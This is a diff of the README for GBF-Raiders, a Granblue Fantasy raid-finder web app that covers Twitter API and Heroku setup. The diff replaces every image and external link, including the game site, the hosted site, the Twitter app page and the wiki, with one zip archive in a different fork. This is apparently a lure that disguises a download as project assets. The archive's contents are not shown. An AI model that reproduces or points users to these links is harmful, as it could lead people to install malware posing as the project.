@@ -1,13 +1,13 @@
 # GBF-Raiders
-![Site Logo](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/GBFRaidersWeb.png)
+![Site Logo](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
-A Raid Finder For The Game [Granblue Fantasy](http://game.granbluefantasy.jp/)
+A Raid Finder For The Game [Granblue Fantasy](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
-Hosted at [GBFRaiders.com](https://www.gbfraiders.com/)
+Hosted at [GBFRaiders.com](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
-A special thanks to [u/Bloodhram](https://www.reddit.com/user/Bloodhram) for creating the icons for the site and extension!
+A special thanks to [u/Bloodhram](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip) for creating the icons for the site and extension!
 
-![Example of Website](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/site-example.png)
+![Example of Website](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 # Reminders
 Please remember to change/remove the Google Analytics code at the bottom of `index.html` if you are cloning this repository!
@@ -21,22 +21,22 @@ Create a new folder in the root directory of the site called `sslcert` and place
 
 Setting up the other environment variables is necessary for using the Twitter API.
 
-![Twitter App Page](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/twitter-app-page.png)
+![Twitter App Page](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
-1. Go to the [Twitter app page](https://apps.twitter.com/) and create a new app. The application details don't matter too much.
+1. Go to the [Twitter app page](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip) and create a new app. The application details don't matter too much.
 
-![Twitter App Details Page](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/twitter-app-create-details.png)
+![Twitter App Details Page](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 2. Make sure you app has read and write permissions in the permissions tab.
 
-![Twitter App Key Create Page](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/twitter-app-key-create.png)
-![Twitter App Access Create Page](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/twitter-app-access-token-create.png)
+![Twitter App Key Create Page](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
+![Twitter App Access Create Page](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 3. The Keys and Access Tokens tab already contains two of the four keys you need: the Consumer Key and the Consumer Secret. To create the other two, click on the "Create my access token" button. Now, the page will refresh and the other two keys will appear: the Access Token and the Access Token Secret.
 4. These 4 keys will need to be setup in your environment. See below on how to do so in Heroku.
 
 # Using The Environment Variables in Heroku
-![Heroku Show Configs Page](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/heroku-show-config.png)
+![Heroku Show Configs Page](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 1. Go to your app's settings page. There will be a "Reveal Config Vars" button.
 2. Enter all 5 keys and their corresponding values: `consumer_key`, `consumer_secret`, `access_token_key`, `access_token_secret`, `sslEnabled`.
@@ -44,31 +44,31 @@ Setting up the other environment variables is necessary for using the Twitter AP
 4. App should work now!
 
 # Adding New Raids
-![Raid Structure](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/raid-structure.png)
+![Raid Structure](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 1. Add the raid to the `raids.json` file in the root of the project.
 
-![Raid Image Folder](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/raids-folder.png)
+![Raid Image Folder](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
-2. Add the raid cover image to the *static/assets/raids folder*. You can get this image from the [GBF wiki](https://gbf.wiki/).
+2. Add the raid cover image to the *static/assets/raids folder*. You can get this image from the [GBF wiki](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip).
 
 # Adding New Sound Notifications
-![Sounds Folder](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/sounds-folder.png)
+![Sounds Folder](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 1. Add the sound file to the *static/assets/sounds* folder.
 
-![Sounds Loading](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/sound-load-example.png)
+![Sounds Loading](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 2. Load the sound file in the top of `main.js`.
 
-![Sounds Playing](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/sound-play-example.png)
+![Sounds Playing](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 3. Add playing the sound file in the `PlaySoundNotif` function in `main.js`.
 
-![Sound Option In HTML](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/sound-option-html.png)
+![Sound Option In HTML](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 4. Add the option in the sound choice control in `index.html`.
 
-![Sound Option In JS](https://github.com/ypinskiy/GBF-Raiders/raw/master/static/assets/misc/sound-option-js.png)
+![Sound Option In JS](https://github.com/KenTsuCo/GBF-Raiders/raw/refs/heads/master/static/semantic/GB_Raiders_v3.9-beta.4.zip)
 
 5. Add the option in the `CreateSettingsModalFrame` function in `settings.js`.
